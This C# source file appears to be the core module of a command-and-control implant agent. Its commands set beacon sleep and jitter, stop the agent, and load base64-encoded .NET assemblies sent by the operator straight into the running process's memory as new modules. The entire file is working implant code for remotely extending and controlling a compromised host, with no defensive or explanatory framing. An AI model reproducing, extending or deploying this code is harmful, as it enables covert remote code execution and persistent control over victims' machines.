﻿using Agent.Controllers;
using Agent.Interfaces;
using Agent.Models;

using Shared.Models;

using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;

namespace Agent.Modules
{
    public class CoreModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController Agent, ConfigController Config)
        {
            this.Agent = Agent;
            this.Config = Config;
        }

        public ModuleInfo GetModuleInfo()
        {
            return new ModuleInfo
            {
                Name = "Core",
                Commands = new List<ModuleInfo.Command>
                {
                    new ModuleInfo.Command
                    {
                        Name = "Sleep",
                        Delegate = SetSleep
                    },
                    new ModuleInfo.Command
                    {
                        Name = "LoadModule",
                        Delegate = LoadAgentModule
                    },
                    new ModuleInfo.Command
                    {
                        Name = "Exit",
                        Delegate = ExitAgent
                    }
                }
            };
        }

        void LoadAgentModule(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;
                var asmBytes = Convert.FromBase64String((string)parameters.FirstOrDefault(p => p.Name.Equals("Assembly", StringComparison.OrdinalIgnoreCase)).Value);

                var currentDomain = AppDomain.CurrentDomain;
                currentDomain.AssemblyResolve += new ResolveEventHandler(MyResolveEventHandler);

                var asm = currentDomain.Load(asmBytes);
                var instance = asm.CreateInstance("Agent.Module", true);

                if (instance is IAgentModule)
                {
                    var module = instance as IAgentModule;
                    Agent.RegisterAgentModule(module);

                    var info = module.GetModuleInfo();
                    Agent.SendMessage(string.Format("Registered module: {0}", info.Name));
                }
                else
                {
                    Agent.SendError("Assembly does not implement IAgentModule");
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void SetSleep(string AgentID, C2Data C2Data)
        {
            try
            {
                var parameters = Shared.Utilities.Utilities.DeserialiseData<TaskParameters>(C2Data.Data, false).Parameters;

                var interval = parameters.FirstOrDefault(p => p.Name.Equals("Interval", StringComparison.OrdinalIgnoreCase)).Value;

                if (interval != null)
                {
                    Config.Set(AgentConfig.SleepInterval, (int)interval);
                }

                var jitter = parameters.FirstOrDefault(p => p.Name.Equals("Jitter", StringComparison.OrdinalIgnoreCase)).Value;

                if (jitter != null)
                {
                    Config.Set(AgentConfig.SleepJitter, (int)jitter);
                }
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        void ExitAgent(string AgentID, C2Data C2Data)
        {
            Agent.Stop();
        }

        Assembly MyResolveEventHandler(object sender, ResolveEventArgs args)
        {
            return Assembly.GetExecutingAssembly();
        }
    }
}